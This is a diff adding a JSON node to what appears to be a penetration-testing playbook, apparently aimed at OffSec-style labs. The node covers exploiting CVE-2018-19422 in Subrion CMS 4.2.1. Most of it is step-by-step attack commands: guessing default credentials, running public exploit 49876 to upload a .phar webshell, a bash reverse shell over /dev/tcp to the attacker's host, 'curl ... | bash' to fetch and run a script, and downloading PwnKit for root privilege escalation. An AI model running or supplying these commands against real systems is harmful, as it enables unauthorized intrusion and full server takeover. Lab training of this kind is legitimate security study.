@@ -1,0 +1,34 @@
+{
+  "id": "subrion",
+  "phase": "EXPLOIT",
+  "title": "Subrion CMS 4.2.1 — CVE-2018-19422 Authenticated File Upload → RCE",
+  "body": "Subrion CMS is a PHP content management system. Version 4.2.1 has an authenticated arbitrary file upload vulnerability (CVE-2018-19422) that allows uploading a .phar webshell through the file manager, bypassing the extension blacklist. The exploit is authenticated — you need working creds first. Default creds (admin:admin) are common and should be tried before anything else.\n\nTwo critical gotchas in the public exploit (49876.py):\n1. The exploit has hardcoded Referer/Origin headers pointing to 192.168.1.20 — if you pass the raw IP as the target, the login POST sends the wrong Referer and the server rejects it. Always use the hostname in -u.\n2. The trailing slash on /panel/ matters — the exploit appends paths to the base URL and breaks without it.\n\nIdentification: generator meta tag says 'Subrion CMS', admin panel at /panel/ (often in robots.txt), version number in the admin login footer ('Powered by Subrion CMS v4.2.1').",
+  "cmd": "# ══════════════════════════════════════════════════\n# IDENTIFY\n# ══════════════════════════════════════════════════\n# Admin panel usually at /panel/ — check robots.txt first:\ncurl -s http://$ip/robots.txt | grep -v '#'\n# Look for: /panel/ in Disallow entries\n\n# Confirm Subrion and get version:\ncurl -s http://hostname/panel/ | grep -iE 'subrion|generator|powered by|version'\n# Footer says: \"Powered by Subrion CMS v4.2.1\"\n# Meta tag: <meta name=\"generator\" content=\"Subrion CMS\"\n\n# ══════════════════════════════════════════════════\n# STEP 1 — DEFAULT CREDS (try before exploit)\n# ══════════════════════════════════════════════════\n# Browse to http://hostname/panel/ and try:\n# admin:admin       ← most common, try first\n# admin:password\n# admin:<domain>    ← e.g. admin:exfiltrated\n# admin:subrion\n# If any work → skip to STEP 3\n\n# ══════════════════════════════════════════════════\n# STEP 2 — SETUP (beautifulsoup4 required)\n# ══════════════════════════════════════════════════\nsearchsploit subrion 4.2\nsearchsploit -m 49876\ncp 49876.py exploit.py\n\n# Install dep — needs venv (PEP 668 blocks system pip):\npython3 -m venv venv\nsource venv/bin/activate\npip install beautifulsoup4\n\n# ══════════════════════════════════════════════════\n# STEP 3 — RUN EXPLOIT\n# ══════════════════════════════════════════════════\n# ⚠ MUST use HOSTNAME not IP — hardcoded Referer/Origin in exploit\n# ⚠ MUST have trailing slash on /panel/\n# First add hostname to /etc/hosts if not already:\necho \"$ip hostname.offsec\" | sudo tee -a /etc/hosts\n\npython3 exploit.py -u http://hostname.offsec/panel/ -l admin -p admin\n# [+] Got CSRF token: ...\n# [+] Login Successful!\n# [+] Generated webshell name: <random15chars>\n# [+] Upload Success... Webshell path: http://hostname.offsec/panel/uploads/<name>.phar\n# $ (interactive shell as www-data)\n\n# ══════════════════════════════════════════════════\n# STEP 4 — UPGRADE TO REAL SHELL\n# ══════════════════════════════════════════════════\n# The .phar webshell is limited — upgrade immediately\n# Set up listener on Kali:\nnc -nlvp 6666\n\n# Host a reverse shell script:\ncat > shell.sh << 'EOF'\n#!/bin/bash\nbash -i >& /dev/tcp/<lhost>/6666 0>&1\nEOF\npython3 -m http.server 8001\n\n# In the webshell prompt:\n# $ curl http://<lhost>:8001/shell.sh | bash\n\n# Upgrade the shell:\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm\n\n# ══════════════════════════════════════════════════\n# STEP 5 — PRIVESC FROM www-data\n# ══════════════════════════════════════════════════\n# Run linpeas — watch for:\n# /usr/bin/pkexec  ---> Generic_CVE-2021-4034  = PwnKit\n# /usr/bin/sudo    ---> check_if_the_sudo_version_is_vulnerable\n# Cron jobs running as root (look in /var/spool/cron and /etc/cron*)\n\n# PwnKit (CVE-2021-4034) if pkexec is SUID:\n# Download precompiled binary:\nwget http://<lhost>:8001/PwnKit -O /var/tmp/PwnKit\nchmod +x /var/tmp/PwnKit\n./PwnKit\n# root@target\n\n# Check cron jobs manually:\ncat /etc/crontab\nls -la /etc/cron*\ncat /var/spool/cron/crontabs/root 2>/dev/null\n\n# ══════════════════════════════════════════════════\n# TROUBLESHOOTING\n# ══════════════════════════════════════════════════\n# '[x] Login failed' with correct creds:\n#   → You're passing the IP not the hostname in -u\n#   → Make sure /etc/hosts has the entry\n#   → Use: python3 exploit.py -u http://hostname.offsec/panel/ (with trailing slash)\n\n# 'ModuleNotFoundError: No module named bs4':\n#   → beautifulsoup4 not installed or venv not activated\n#   → source venv/bin/activate && pip install beautifulsoup4\n\n# Webshell not found after upload:\n#   → Try accessing: http://hostname.offsec/uploads/<name>.phar?cmd=id\n#   → Note: URL is /uploads/ NOT /panel/uploads/\n#   → The exploit strips /panel from url_shell automatically\n\n# Login page redirects to IP not hostname:\n#   → The exploit follows the redirect to the raw IP\n#   → Try: python3 exploit.py -u http://hostname.offsec/panel/ (no port number)",
+  "warn": "Always use the HOSTNAME not the IP in the -u flag — the exploit hardcodes Referer and Origin headers that cause login failure when the target URL is an IP. Trailing slash on /panel/ is required. Try admin:admin before running the exploit — it works more often than expected and skips the whole setup. The webshell URL path is /uploads/<name>.phar (no /panel/ prefix) — the exploit handles this automatically but manual testing needs the right path.",
+  "choices": [
+    {
+      "label": "Got www-data shell — run linpeas for privesc",
+      "next": "linpeas"
+    },
+    {
+      "label": "pkexec SUID found — PwnKit",
+      "next": "pwnkit"
+    },
+    {
+      "label": "Cron job running as root — abuse it",
+      "next": "cron_check"
+    },
+    {
+      "label": "Got root",
+      "next": "got_root_linux"
+    },
+    {
+      "label": "Need venv setup",
+      "next": "python_venv_setup"
+    },
+    {
+      "label": "Back to CMS enum",
+      "next": "cms_version_enum"
+    }
+  ]
+}
